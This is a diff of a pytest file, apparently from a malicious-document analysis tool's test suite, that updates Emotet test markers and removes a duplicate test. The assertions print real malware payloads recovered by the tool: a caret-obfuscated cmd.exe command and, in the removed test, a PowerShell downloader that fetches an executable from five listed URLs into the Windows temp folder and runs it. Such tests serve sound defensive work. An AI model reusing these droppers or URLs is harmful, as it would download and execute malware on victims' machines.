@@ -69,8 +69,10 @@ def test_9f51918746416b2d8b1d6062030afc723ea45f65a97b29737aeb7fa0004ebb2a(path):
 
 @pytest.mark.emotet
 @pytest.mark.word2007
+@pytest.mark.func_CByte
+@pytest.mark.func_Shell
+@pytest.mark.func_StrReverse
 @pytest.mark.thisdocument_run
-@pytest.mark.func_strreverse
 @pytest.mark.fast
 def test_ceb007931bb5b6219960d813008c28421b7b7abfcc05d0813df212ddcfa5b64f(path):
 	''' word 2007+ zip format, ThisDocument.Run'''
@@ -274,17 +276,6 @@ def test_e96925f02b3a1c911be15b229c4bbca4e42ddf679386cf485e3b99c71109ae41(path):
 	r=t.run()
 	# NB: I actually had to jigger around with this string because of the backslashes.. 
 	assert r[0][1][1] == '''cmd /V^:^ON/C"^s^e^t ^l^K^k=^s^5^4^ ^,^w^Q^ ^h^F^`^ ,^pN^ ^4^i^p^ ^m^`^*^ M^A^; ^W'E^ ^]^.^$^ c^U^?^ Wy^\\^ E^*^?^ ^H^y^Q^ @^+^l^ %^`^e^ ^[^s^6^ ^i^A^=^ u^>^G^}^j^8^+^}^<V^s^{^H%^q^h^#^}^fc^`^]^e^t^{^=U^a^p^K^_c^6/^.^}^G^[^5^;^8^J^u^k^T(^i^a^7^H^L^e^2^m)r^mM^2^b^j^<^t^;^G^w^=^S^p5^o^i0^b^H^W^d^Z^G^$^<^G^H^ ^1h^A^mV^Zr^e^9^Dc^t^6^J^Y^I/^~^_^-v^q^U^e^sn^i^kg^p^P^o^iZ^$v^g^h^Tn/^t^D^I^*^W^;^;^Is/)^|^E^m^S(^d^P^i^[v^k^W^_^&^ ^$^&^J^7^ ^&^8^W^,^<^l^{^E9^L(^U^d^S8r^|^&^ ^$^l^+^f(%^,^A^e^j^;R^l^0^1`^i) ^}^F^~Z^L^d^-^d^O^a^Q^1n^o^S^4^3^l^X^ ^Pn^Yu^f^w^L^:^|^o^s^l^O^DN^Y^7^.^A^=^*c^|7^x^H/^|^`^w^J[^7^$^1^h^I^{{^.^H^y^<^\\^xr^6^5^I^t^B^2^4^{r8^')^3)^2^J^bg@^GV^Xc^S,^U^]$^&^0^|^ ^u^j^=n^K^@r^i^A^sv^ ^|^k^<E^Q^;^Z^U^H^E^ r^X^A^y^$^0^s^7(^;^K^}^h^|^~^dc^=z^o^aV^b^z^e^0^*^Hr^~^d^H^o^F^o^E^f^`^.^X^;/^;M^'^l)^X^eR^}^_^x^98^0e^7^2n^.^[^ky^'^q^m%^+^X^L^;^o^]^[^&^p ^[^\\^i^#^D^'$^4^x^~^+^x^mW^'^2N,\\^Z^'^B^'^q^$I^+^]^#^:c^z^.V^i^O^<^k^l^g~^s^br^S^I^u^p^z1^p^pd^Y^:^<wvv^J^+^xn^y^W^2^e^p^0}^$^7^?0^=^4,^Y^S^O^T^7^i^&^+^O^W^w^:'^$^O^s^7^;^lF^|^'^`^y^3^9^5^j~^4^y%^M^7^[^D^t^'^\\^D^+^ ^m^Hc^=^o^+^}^ ^<^4^L^oY^M^Z^p^z^l^U^i^~V^J^$^a^m^f^;%^4^h)^#^S^+^'^3^*^e^@^Q^8^T^'r^i^a(J^H^_^t^H^9^&^iT^>^I^l^+H^a^p^f^`K^S^.^{c^.^A^l^0^'W^>^J^3^_^E^y^O^e^3^U^0^O^,^ ^U^Ym)^9^s^q^P^p^d^+^&^Hv^XC/^3^h^Lr^9^+^u^f^d^]^O^.^+^'^}^l^~^o^J^y^M^O^*^-%^kc^t^i^L^dc^m^S^P^a^5^&^>^t^{^O^M/^`^W^u/c^t`^:^g^<^f^p^Y^S^K^t^2^fW^t7^W^.^hn^J^K^@rCN^g^}^U^4^1^,^U^|^1^5v^F^8^T^A^tF^1^#%^A^K^M^2^P^4^JgVN^'^s^X^Ox^h/^:^g^.^l^l^J^W^p^a^.^'^.^s^[^m^e^`^Q^|n^4^@^&o^J^6n^d^?^Q^0^.^D^X^j3^ ^\\v^a^X^}^err7^0^t^O^2^ql^7^M^=^u(N^y.^'^;^5^a^K^|cn^[^>^y^l^[^_^P^a=^`^T^t^wbC^i^G^K^7^wC^2^f/^Q^j^6/^P^L^z^:^0^+^M^p^z^0^[^t[ ^o^t^Y%X^h^6^9^d^@D^k^t^X^8^4^[^0.^2c^9^+^&/^4^h^8^W^y^U^+^t^f^b^8^3^2^#^f^T^7^I^g^H^U^>^x^@/^]^s^X^m^AeVo^<^7^0c^P^x^<^.^;^s^<c^*/^m^i(^1^zn^h^H^'^o^d^W/^s^@V^g^1^S^lu^0^=u^b1c1^y^.#CZ^w^L^5^1^w^lv^e^w^p^l)/^<^:^s/^X^B^.^:'^~^.^p^W^2^L^t^\\^u^m^t^u/^$^h^i^p^<^@-^./^L^>c^[G^U^s^d^SV^J^H^F^&^S^W^g^D^i^K^fe^.^A^b^&^b^S//^|^B^m^L^$n^o^1^F^mcC^6^9^.\\c^xn^9^.^sr+v^8^o^J^~^acc^Zy^pV/^Io^ ^#^6^p^O^iR^m^=^[n^o^_^&@o^>T^X^ln^|#r^L^-^S^i^+^$^Q^er^Zt^h^,^s^p/^[^h^ /^<^Ku^:^7^k^5^p^;0^ft^<^`^g^t^j^p^Q^h^gN9^@^x^D^=^D^iL^]^X^O^6^Y^u^?^P^4^B^H)^8^E^H^,^S^9^o^U^+^K/^P^b^z^P^4s^b^3^&^g^9^4^g^d/^1ac^m^b^s^$^o^*^8^Kc^>^S^f^.^@^2no^]^,^A^m^B^W^Oh^A^Mn^s^J^3^I^a^g^[^=^m^+^P^K^l/^`^-^a^+^0^#^p%^7^H^s^G^a^L^aY^a^4^l^=l^dl^l^g^~^e^2^o(^t^z^@^,^o^=^q_^h)C^]/^{^>^./^k^T^i^:^&^'^G^p^a^Q^h^t^[^D^Z^t^D^`^S^hN^[^a^'^E^Z^D^=^Ir^9^J/(^i^G^5^s^f^S)%^1$^y^E^U^;^Y^0^:^te0^{n^\\^9k^e^0^H^'^i^j)^Q^l)^meC^17^l^bA^\^g^e^B^o^4^WK(^E^.d^*^D^t^[(^:e^E%^@N^k^0^=^ ^T^{^ ^t^;^1^]c^]^~^Me^:^'^g^j^q^.^$^b^4^L^K^o^H^S^M^-p^.^Ww^]^X^y^e^T^|^mn^M^0^6^=^[^L^_c^I^])^H^J^m^U^w^|^*V$^X^<^Q^ `A^X^l^+^m^}^l^q4^'^e^W^<^J^h^`^S^B^s^B^d^Sr^lv^p^el^+^<^wr^[^z^o^w^2^#^p&&for /^L %v ^in (^1^53^9^,^-^4,^3)^d^o ^s^e^t ^Fc^W^2=!^Fc^W^2!!^l^K^k:~%v,1!&&^i^f %v ^l^s^s ^4 c^a^l^l %^Fc^W^2:^~^-^3^8^5%"'''
-
-@pytest.mark.emotet
-@pytest.mark.word2007
-@pytest.mark.func_CByte
-@pytest.mark.func_Shell
-@pytest.mark.func_StrReverse
-def test_ceb007931bb5b6219960d813008c28421b7b7abfcc05d0813df212ddcfa5b64f(path):
-	''' emotet breaks pyparsing 2.3.1, not 2.3.0 '''
-	t=maldoc(path+'ceb007931bb5b6219960d813008c28421b7b7abfcc05d0813df212ddcfa5b64f')
-	r=t.run()
-	assert r[0][3][1] == """powershell $upn0rxUQ9 = \'$A79ly2i = new-obj0-9288027360ect -com0-9288027360obj0-9288027360ect wsc0-9288027360ript.she0-9288027360ll;$hC0u5Lk = new-object sys0-9288027360tem.net.web0-9288027360client;$eeVnNb = new-object random;$ME8h0Y = \\"0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://bignorthbarbell.com/yuf2G22rSI3c0s,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://mail.dentaladvance.pt/iyRttLHb,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://3d.tdselectronics.com/IWZfq9gD,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://greenflagtrails.co.za/HOHvd9NFU_BaZ62,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://kuoying.net/wp-admin/NcdixzAUZNsxHs0_8DoIcKe\\".spl0-9288027360it(\\",\\");$AmPFqKf = $eeVnNb.nex0-9288027360t(1, 65536);$V2sUJ = \\"c:\\win0-9288027360dows\\tem0-9288027360p\\24.ex0-9288027360e\\";for0-9288027360each($Y92Bsgj in $ME8h0Y){try{$hC0u5Lk.dow0-9288027360nlo0-9288027360adf0-9288027360ile($Y92Bsgj.ToS0-9288027360tring(), $V2sUJ);sta0-9288027360rt-pro0-9288027360cess $V2sUJ;break;}catch{}}\'.replace(\'0-9288027360\', $NRYM8nmxZ);$c4xw1H = \'\';iex($upn0rxUQ9);"""
 
 @pytest.mark.word2007
 @pytest.mark.slow
